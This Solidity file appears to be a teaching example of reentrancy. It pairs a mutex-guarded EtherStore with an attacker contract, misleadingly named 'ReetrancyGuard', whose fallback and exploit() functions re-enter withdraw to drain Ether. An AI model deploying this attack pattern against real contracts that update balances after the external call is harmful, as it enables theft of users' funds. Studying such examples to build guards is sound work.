//SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract EtherStore {
  mapping(address => uint) public balances;
  bool internal locked;

  modifier noReetrancy() {
    require(!locked, "No re etrancy");
    locked = true;
    _;
    locked = false;
  }

  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint _amount) public noReetrancy {
    require(balances[msg.sender] >= _amount, "Not enough Ether");

    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "failed to withdraw");

    balances[msg.sender] -= _amount;
  }

  function getGlobalBalance() public view returns (uint) {
    return address(this).balance;
  }

  function getBalance() public view returns (uint) {
    return balances[msg.sender];
  }
}

contract ReetrancyGuard {
  EtherStore public _etherStore;

  constructor(address _deployedAddress) {
    _etherStore = EtherStore(_deployedAddress);
  }

  fallback() external payable {
    if (address(_etherStore).balance >= 1) {
      _etherStore.withdraw(1 ether);
    }
  }

  receive() external payable {}

  function exploit() external payable {
    require(msg.value >= 1 ether);
    _etherStore.deposit{value: 1 ether}();
    _etherStore.withdraw(1 ether);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}